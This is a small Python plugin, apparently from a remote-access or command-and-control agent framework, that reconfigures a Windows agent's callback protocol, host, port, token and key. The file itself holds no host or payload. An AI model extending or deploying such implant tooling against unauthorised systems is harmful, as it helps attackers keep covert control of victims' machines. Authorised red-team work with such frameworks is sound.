PLUGIN = {
    "name": "Windows 协议升级",
    "commands": ["wupgrade"],
    "platform": "windows",
    "risk": "R2",
    "description": "切换回连地址、端口、协议，可同时指定 token 和密钥",
    "write_disk": False,
}


def run(runtime, args):
    payload = {}
    for key in ("protocol", "host", "port", "url", "token", "key"):
        value = args.get(key)
        if value not in (None, ""):
            payload[key] = value
    if not payload:
        return {"error": "no upgrade parameters supplied"}
    result = runtime.prepare_upgrade(payload)
    runtime.emit(runtime.stringify(result))
    return result
